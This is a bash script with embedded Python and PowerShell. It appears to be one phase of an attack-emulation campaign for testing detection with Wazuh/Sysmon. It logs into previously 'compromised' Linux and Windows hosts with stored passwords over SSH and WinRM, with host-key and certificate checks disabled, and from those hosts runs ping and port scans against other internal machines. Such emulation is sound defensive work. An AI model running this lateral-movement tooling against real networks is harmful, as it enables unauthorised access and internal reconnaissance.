#!/usr/bin/env bash

set -u


# ============================================================
# Nordic Manufacturing A/S
# H3 Incident Campaign V2
#
# Phase 04 - Internal Discovery / Lateral Activity
#
# Linux compromised hosts:
#   Execute discovery through SSH.
#
# Windows compromised hosts:
#   Execute discovery through WinRM / PowerShell.
#
# Source:
#   Hosts successfully compromised in Phase 03
#
# Targets:
#   Other hosts discovered in Phase 01
#
# Activity:
#   - ICMP discovery
#   - TCP probes against internal services
#
# Ports:
#   22    SSH
#   80    HTTP
#   443   HTTPS
#   445   SMB
#   3389  RDP
#   5985  WinRM HTTP
#   5986  WinRM HTTPS
# ============================================================


# ============================================================
# PATHS / CONFIG
# ============================================================

BASE_DIR="/opt/nordic-attack"
CONFIG_FILE="$BASE_DIR/config/defaults.conf"

if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "[ERROR] Configuration file not found: $CONFIG_FILE"
    exit 1
fi

# shellcheck source=/dev/null
source "$CONFIG_FILE"

mkdir -p \
    "$NORDIC_LOG_DIR" \
    "$NORDIC_STATE_DIR"


# ============================================================
# CONFIGURATION
# ============================================================

INCIDENT_ID="${NORDIC_INCIDENT_ID:-H3-$(date +%Y%m%d-%H%M%S)}"


# ------------------------------------------------------------
# Linux
# ------------------------------------------------------------

SSH_PASSWORD="${NORDIC_SSH_PASSWORD:-$NORDIC_DEFAULT_SSH_PASSWORD}"


# ------------------------------------------------------------
# Windows
# ------------------------------------------------------------

RDP_PASSWORD="${NORDIC_RDP_PASSWORD:-${NORDIC_DEFAULT_RDP_PASSWORD:-}}"

WINRM_HTTP_PORT="${NORDIC_WINRM_HTTP_PORT:-${NORDIC_DEFAULT_WINRM_HTTP_PORT:-5985}}"

WINRM_HTTPS_PORT="${NORDIC_WINRM_HTTPS_PORT:-${NORDIC_DEFAULT_WINRM_HTTPS_PORT:-5986}}"

WINRM_TIMEOUT="${NORDIC_WINRM_TIMEOUT:-5}"


DISCOVERED_STATE="$NORDIC_DISCOVERED_STATE"
COMPROMISED_STATE="$NORDIC_COMPROMISED_STATE"

LOG_FILE="$NORDIC_LOG_DIR/${INCIDENT_ID}-04-lateral.log"


# ------------------------------------------------------------
# Internal probe ports
# ------------------------------------------------------------

if [[ -n "${NORDIC_INTERNAL_PROBE_PORTS:-}" ]]; then

    PROBE_PORTS="$(
        tr ',' ' ' <<< "$NORDIC_INTERNAL_PROBE_PORTS"
    )"

else

    PROBE_PORTS="22 80 443 445 3389 5985 5986"

fi


# ============================================================
# FUNCTIONS
# ============================================================

log() {

    local MESSAGE="$1"

    echo "$MESSAGE"

    printf '%s %s\n' \
        "$(date --iso-8601=seconds)" \
        "$MESSAGE" \
        >> "$LOG_FILE"
}


ground_truth() {

    local MESSAGE="$1"

    printf '%s INCIDENT=%s PHASE=04 %s\n' \
        "$(date --iso-8601=seconds)" \
        "$INCIDENT_ID" \
        "$MESSAGE" \
        >> "$NORDIC_GROUND_TRUTH_LOG"
}


tcp_open() {

    local HOST="$1"
    local PORT="$2"

    timeout "$NORDIC_CONNECT_TIMEOUT" \
        bash -c "echo >/dev/tcp/$HOST/$PORT" \
        >/dev/null 2>&1
}


# ============================================================
# REQUIRED COMMANDS
# ============================================================

for CMD in python3 sshpass ssh timeout curl; do

    if ! command -v "$CMD" >/dev/null 2>&1; then

        echo "[ERROR] Required command not found: $CMD"
        exit 1

    fi

done


# ============================================================
# WINDOWS WINRM CLIENT
# ============================================================
#
# We use Python pywinrm for Windows command execution.
#
# Phase 3:
#   RDP proves the supplied credentials work.
#
# Phase 4:
#   WinRM gives the campaign a controlled remote execution
#   channel for PowerShell.
# ============================================================

PYWINRM_AVAILABLE=0

if python3 -c "import winrm" >/dev/null 2>&1; then
    PYWINRM_AVAILABLE=1
fi


# ============================================================
# VALIDATION
# ============================================================

if [[ ! -f "$DISCOVERED_STATE" ]]; then

    echo "[ERROR] Missing discovered host inventory."
    echo "Run Phase 01 first."

    exit 1
fi


if [[ ! -f "$COMPROMISED_STATE" ]]; then

    echo "[ERROR] Missing compromised host inventory."
    echo "Run Phase 03 first."

    exit 1
fi


# ============================================================
# LOAD TARGETS
# ============================================================

mapfile -t TARGETS < <(

    python3 - "$DISCOVERED_STATE" <<'PY'
import json
import sys

with open(sys.argv[1], encoding="utf-8") as f:
    data = json.load(f)

for host in data.get("hosts", []):
    ip = host.get("ip")

    if ip:
        print(ip)
PY

)


# ============================================================
# LOAD COMPROMISED HOSTS
#
# Format:
#
#   IP|PLATFORM|ACCESS|PORT|USER
#
# Backwards compatible:
#   Old SSH-only compromised state is interpreted as Linux.
# ============================================================

mapfile -t COMPROMISED < <(

    python3 - "$COMPROMISED_STATE" <<'PY'
import json
import sys

with open(sys.argv[1], encoding="utf-8") as f:
    data = json.load(f)

for host in data.get("hosts", []):

    ip = host.get("ip")

    if not ip:
        continue

    platform = host.get("platform", "").lower()
    access = host.get("access", "").lower()


    # --------------------------------------------------------
    # Old V2 state compatibility
    # --------------------------------------------------------

    if not platform:

        if access == "rdp":
            platform = "windows"
        else:
            platform = "linux"


    # --------------------------------------------------------
    # Linux
    # --------------------------------------------------------

    if platform == "linux":

        port = host.get(
            "ssh_port",
            22
        )

        user = (
            host.get("ssh_username")
            or host.get("ssh_user")
            or "ubuntu"
        )

        print(
            f"{ip}|linux|ssh|{port}|{user}"
        )


    # --------------------------------------------------------
    # Windows
    # --------------------------------------------------------

    elif platform == "windows":

        port = host.get(
            "rdp_port",
            3389
        )

        user = (
            host.get("rdp_username")
            or host.get("rdp_user")
            or "Administrator"
        )

        print(
            f"{ip}|windows|rdp|{port}|{user}"
        )
PY

)


# ============================================================
# BANNER
# ============================================================

echo
echo "============================================================"
echo " NORDIC MANUFACTURING"
echo " H3 INCIDENT CAMPAIGN V2"
echo " PHASE 04 - INTERNAL DISCOVERY"
echo "============================================================"
echo

log "[*] Incident ID: $INCIDENT_ID"
log "[*] Compromised source hosts: ${#COMPROMISED[@]}"
log "[*] Discovered internal targets: ${#TARGETS[@]}"
log "[*] Probe ports: $PROBE_PORTS"

echo


if [[ ${#COMPROMISED[@]} -eq 0 ]]; then

    log "[*] No compromised hosts available."
    log "[*] Phase 04 has nothing to execute."

    ground_truth \
        "PHASE_COMPLETE sources=0 relationships=0"

    exit 0
fi


# ============================================================
# COUNTERS
# ============================================================

TOTAL_RELATIONSHIPS=0

SUCCESSFUL_SOURCES=0
FAILED_SOURCES=0
SKIPPED_SOURCES=0

LINUX_SOURCES=0
WINDOWS_SOURCES=0


# ============================================================
# PROCESS COMPROMISED SOURCES
# ============================================================

for SOURCE_RECORD in "${COMPROMISED[@]}"; do

    IFS='|' read -r \
        SOURCE \
        PLATFORM \
        ACCESS \
        ACCESS_PORT \
        ACCESS_USER \
        <<< "$SOURCE_RECORD"


    echo
    echo "############################################################"
    echo " COMPROMISED SOURCE: $SOURCE"
    echo " PLATFORM:           $PLATFORM"
    echo "############################################################"
    echo


    ground_truth \
        "INTERNAL_DISCOVERY_START source=$SOURCE platform=$PLATFORM"


    # --------------------------------------------------------
    # Build target array
    # --------------------------------------------------------

    REMOTE_TARGETS=()

    for TARGET in "${TARGETS[@]}"; do

        if [[ "$TARGET" == "$SOURCE" ]]; then
            continue
        fi

        REMOTE_TARGETS+=(
            "$TARGET"
        )

    done


    if [[ ${#REMOTE_TARGETS[@]} -eq 0 ]]; then

        log "[*] No additional targets for $SOURCE"

        continue
    fi


    log "[*] Starting internal discovery from $SOURCE"
    log "[*] Platform: $PLATFORM"
    log "[*] Targets from $SOURCE: ${#REMOTE_TARGETS[@]}"


    # ========================================================
    # LINUX SOURCE
    # ========================================================

    if [[ "$PLATFORM" == "linux" ]]; then

        LINUX_SOURCES=$(( LINUX_SOURCES + 1 ))


        if [[ -z "$SSH_PASSWORD" ]]; then

            FAILED_SOURCES=$(( FAILED_SOURCES + 1 ))

            log "[WARNING] SSH password unavailable for $SOURCE"

            ground_truth \
                "INTERNAL_DISCOVERY_FAILED source=$SOURCE platform=linux reason=missing_credentials"

            continue
        fi


        # ----------------------------------------------------
        # Remote Linux discovery script
        # ----------------------------------------------------

        read -r -d '' REMOTE_SCRIPT <<REMOTE_EOF || true

PORTS="$PROBE_PORTS"

for TARGET in "\$@"; do

    echo "[DISCOVERY] target=\$TARGET"


    if ping -c 1 -W 1 "\$TARGET" >/dev/null 2>&1; then

        echo "[PING] target=\$TARGET status=reachable"

    else

        echo "[PING] target=\$TARGET status=no-reply"

    fi


    for PORT in \$PORTS; do

        if timeout 1 bash -c \
            "echo >/dev/tcp/\$TARGET/\$PORT" \
            >/dev/null 2>&1
        then

            echo "[TCP] target=\$TARGET port=\$PORT status=open"

        else

            echo "[TCP] target=\$TARGET port=\$PORT status=closed"

        fi

    done

done

REMOTE_EOF


        # ----------------------------------------------------
        # Execute FROM compromised Linux host
        # ----------------------------------------------------

        REMOTE_OUTPUT="$(
            sshpass -p "$SSH_PASSWORD" \
                ssh \
                    -p "$ACCESS_PORT" \
                    -o StrictHostKeyChecking=no \
                    -o UserKnownHostsFile=/dev/null \
                    -o ConnectTimeout="$NORDIC_SSH_TIMEOUT" \
                    -o PreferredAuthentications=password \
                    -o PubkeyAuthentication=no \
                    "$ACCESS_USER@$SOURCE" \
                    bash -s -- "${REMOTE_TARGETS[@]}" \
                    <<< "$REMOTE_SCRIPT" \
                    2>&1
        )"

        RESULT=$?


        while IFS= read -r LINE; do

            [[ -z "$LINE" ]] && continue

            log "[$SOURCE][LINUX] $LINE"

        done <<< "$REMOTE_OUTPUT"


        if [[ $RESULT -ne 0 ]]; then

            FAILED_SOURCES=$(( FAILED_SOURCES + 1 ))

            log "[WARNING] Internal discovery failed from Linux host $SOURCE"

            ground_truth \
                "INTERNAL_DISCOVERY_FAILED source=$SOURCE platform=linux"

            continue
        fi


        SUCCESSFUL_SOURCES=$(( SUCCESSFUL_SOURCES + 1 ))


    # ========================================================
    # WINDOWS SOURCE
    # ========================================================

    elif [[ "$PLATFORM" == "windows" ]]; then

        WINDOWS_SOURCES=$(( WINDOWS_SOURCES + 1 ))


        if [[ -z "$RDP_PASSWORD" ]]; then

            FAILED_SOURCES=$(( FAILED_SOURCES + 1 ))

            log "[WARNING] Windows password unavailable for $SOURCE"

            ground_truth \
                "INTERNAL_DISCOVERY_FAILED source=$SOURCE platform=windows reason=missing_credentials"

            continue
        fi


        # ----------------------------------------------------
        # Determine WinRM endpoint
        # ----------------------------------------------------

        WINRM_PORT=""
        WINRM_TRANSPORT=""
        WINRM_SCHEME=""


        if tcp_open "$SOURCE" "$WINRM_HTTP_PORT"; then

            WINRM_PORT="$WINRM_HTTP_PORT"
            WINRM_TRANSPORT="ntlm"
            WINRM_SCHEME="http"

            log "[+] WinRM HTTP available: $SOURCE:$WINRM_PORT"


        elif tcp_open "$SOURCE" "$WINRM_HTTPS_PORT"; then

            WINRM_PORT="$WINRM_HTTPS_PORT"
            WINRM_TRANSPORT="ntlm"
            WINRM_SCHEME="https"

            log "[+] WinRM HTTPS available: $SOURCE:$WINRM_PORT"

        else

            SKIPPED_SOURCES=$(( SKIPPED_SOURCES + 1 ))

            log "[SKIPPED] Windows host $SOURCE has no reachable WinRM service."

            ground_truth \
                "INTERNAL_DISCOVERY_SKIPPED source=$SOURCE platform=windows reason=winrm_unavailable"

            continue
        fi


        if [[ $PYWINRM_AVAILABLE -ne 1 ]]; then

            SKIPPED_SOURCES=$(( SKIPPED_SOURCES + 1 ))

            log "[SKIPPED] Python pywinrm is not installed."

            ground_truth \
                "INTERNAL_DISCOVERY_SKIPPED source=$SOURCE platform=windows reason=pywinrm_unavailable"

            continue
        fi


        # ----------------------------------------------------
        # Convert target array into JSON.
        #
        # This avoids shell quoting problems when passing
        # arrays to PowerShell.
        # ----------------------------------------------------

        TARGET_JSON="$(
            printf '%s\n' "${REMOTE_TARGETS[@]}" |
            python3 -c '
import json
import sys

targets = [
    line.strip()
    for line in sys.stdin
    if line.strip()
]

print(json.dumps(targets))
'
        )"


        # ----------------------------------------------------
        # Execute controlled PowerShell discovery through
        # WinRM.
        #
        # This intentionally launches normal Windows tools
        # and TCP connection attempts so Wazuh/Sysmon can
        # observe process and network activity.
        # ----------------------------------------------------

        WINDOWS_OUTPUT="$(
            NORDIC_WINRM_PASSWORD="$RDP_PASSWORD" \
            NORDIC_TARGET_JSON="$TARGET_JSON" \
            python3 - \
                "$SOURCE" \
                "$WINRM_PORT" \
                "$WINRM_SCHEME" \
                "$WINRM_TRANSPORT" \
                "$ACCESS_USER" \
                "$PROBE_PORTS" <<'PY'
import json
import os
import sys

import winrm


host = sys.argv[1]
port = int(sys.argv[2])
scheme = sys.argv[3]
transport = sys.argv[4]
username = sys.argv[5]
ports = [
    int(x)
    for x in sys.argv[6].split()
]

password = os.environ["NORDIC_WINRM_PASSWORD"]

targets = json.loads(
    os.environ["NORDIC_TARGET_JSON"]
)


endpoint = f"{scheme}://{host}:{port}/wsman"


session = winrm.Session(
    endpoint,
    auth=(username, password),
    transport=transport,
    server_cert_validation="ignore",
)


targets_ps = ",".join(
    "'" + target.replace("'", "''") + "'"
    for target in targets
)

ports_ps = ",".join(
    str(port)
    for port in ports
)


powershell = rf'''
$Targets = @({targets_ps})
$Ports = @({ports_ps})

Write-Output "[WINDOWS] hostname=$env:COMPUTERNAME"
Write-Output "[WINDOWS] user=$env:USERNAME"

foreach ($Target in $Targets) {{

    Write-Output "[DISCOVERY] target=$Target"

    $PingResult = Test-Connection `
        -ComputerName $Target `
        -Count 1 `
        -Quiet `
        -ErrorAction SilentlyContinue

    if ($PingResult) {{
        Write-Output "[PING] target=$Target status=reachable"
    }}
    else {{
        Write-Output "[PING] target=$Target status=no-reply"
    }}


    foreach ($Port in $Ports) {{

        try {{

            $Client = New-Object System.Net.Sockets.TcpClient

            $Result = $Client.BeginConnect(
                $Target,
                $Port,
                $null,
                $null
            )

            $Success = $Result.AsyncWaitHandle.WaitOne(
                1000,
                $false
            )

            if ($Success -and $Client.Connected) {{

                $Client.EndConnect($Result)

                Write-Output "[TCP] target=$Target port=$Port status=open"

            }}
            else {{

                Write-Output "[TCP] target=$Target port=$Port status=closed"

            }}

            $Client.Close()

        }}
        catch {{

            Write-Output "[TCP] target=$Target port=$Port status=closed"

        }}

    }}

}}
'''


result = session.run_ps(
    powershell
)


stdout = result.std_out.decode(
    "utf-8",
    errors="replace"
)

stderr = result.std_err.decode(
    "utf-8",
    errors="replace"
)


if stdout:
    print(
        stdout,
        end=""
    )


if stderr:
    print(
        stderr,
        file=sys.stderr,
        end=""
    )


sys.exit(
    0 if result.status_code == 0 else 1
)
PY
        )"

        RESULT=$?


        while IFS= read -r LINE; do

            [[ -z "$LINE" ]] && continue

            log "[$SOURCE][WINDOWS] $LINE"

        done <<< "$WINDOWS_OUTPUT"


        if [[ $RESULT -ne 0 ]]; then

            FAILED_SOURCES=$(( FAILED_SOURCES + 1 ))

            log "[WARNING] Internal discovery failed from Windows host $SOURCE"

            ground_truth \
                "INTERNAL_DISCOVERY_FAILED source=$SOURCE platform=windows"

            continue
        fi


        SUCCESSFUL_SOURCES=$(( SUCCESSFUL_SOURCES + 1 ))


    # ========================================================
    # UNKNOWN PLATFORM
    # ========================================================

    else

        SKIPPED_SOURCES=$(( SKIPPED_SOURCES + 1 ))

        log "[SKIPPED] Unknown platform for $SOURCE: $PLATFORM"

        ground_truth \
            "INTERNAL_DISCOVERY_SKIPPED source=$SOURCE reason=unknown_platform"

        continue

    fi


    # ========================================================
    # SUCCESSFUL SOURCE
    # ========================================================

    for TARGET in "${REMOTE_TARGETS[@]}"; do

        TOTAL_RELATIONSHIPS=$(( TOTAL_RELATIONSHIPS + 1 ))

        ground_truth \
            "INTERNAL_DISCOVERY source=$SOURCE platform=$PLATFORM target=$TARGET"

    done


    log "[+] Internal discovery completed from $SOURCE"

done


# ============================================================
# SUMMARY
# ============================================================

echo
echo "============================================================"
echo " PHASE 04 COMPLETED"
echo "============================================================"
echo

echo "Compromised source hosts:"
echo "  ${#COMPROMISED[@]}"

echo

echo "Linux source hosts:"
echo "  $LINUX_SOURCES"

echo

echo "Windows source hosts:"
echo "  $WINDOWS_SOURCES"

echo

echo "Successful source hosts:"
echo "  $SUCCESSFUL_SOURCES"

echo

echo "Failed source hosts:"
echo "  $FAILED_SOURCES"

echo

echo "Skipped source hosts:"
echo "  $SKIPPED_SOURCES"

echo

echo "Discovered internal hosts:"
echo "  ${#TARGETS[@]}"

echo

echo "Source → target relationships:"
echo "  $TOTAL_RELATIONSHIPS"

echo

echo "Probe ports:"
echo "  $PROBE_PORTS"

echo

echo "Log:"
echo "  $LOG_FILE"

echo


ground_truth \
    "PHASE_COMPLETE sources=${#COMPROMISED[@]} linux_sources=$LINUX_SOURCES windows_sources=$WINDOWS_SOURCES successful_sources=$SUCCESSFUL_SOURCES failed_sources=$FAILED_SOURCES skipped_sources=$SKIPPED_SOURCES relationships=$TOTAL_RELATIONSHIPS"


exit 0